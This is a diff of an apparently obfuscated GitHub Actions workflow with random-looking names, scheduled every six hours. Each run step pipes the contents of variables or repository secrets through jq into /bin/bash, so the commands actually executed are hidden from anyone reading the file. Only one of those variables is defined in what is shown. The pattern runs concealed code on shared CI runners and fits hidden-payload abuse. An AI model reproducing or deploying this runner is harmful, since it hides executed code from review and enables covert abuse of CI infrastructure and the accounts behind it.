@@ -1,22 +1,28 @@
 name: pierseleeli
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 1/6 * * *'
-
-jobs:  # 26098
+    - cron: '30 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pierseleeli
         env:
-          guba41613: ${{ secrets.guba41613 }}
+          f2088: ${{ secrets.f2088 }}
         run: |
-          echo $guba41613 | jq -r .kq3047 | /bin/bash
-          echo $lti5889 | jq -r .n1 | /bin/bash
-          echo $nr29097 | jq -r .gvxj12581 | /bin/bash
-          echo $kfm9826 | jq -r .i63439 | /bin/bash
-          echo $fd026 | jq -r .caa66 | /bin/bash
+          echo $f2088 | jq -r .oo94 | /bin/bash
+          echo $xz929 | jq -r .i7 | /bin/bash
+          echo $bcyk0432 | jq -r .ckt254 | /bin/bash
+          echo $bti406 | jq -r .olh368 | /bin/bash
+          echo $zyab4836 | jq -r .drqr18 | /bin/bash
+          echo $lwoav2731 | jq -r .e1 | /bin/bash
+          echo $q3408 | jq -r .adu41 | /bin/bash
+          echo $cq663 | jq -r .bdxbo33861 | /bin/bash
+          echo $or716 | jq -r .xk5 | /bin/bash
+          echo $nkupz8 | jq -r .i4 | /bin/bash
+          echo $gh96160 | jq -r .dgk8 | /bin/bash
+          echo $nbm7 | jq -r .lju327 | /bin/bash
 
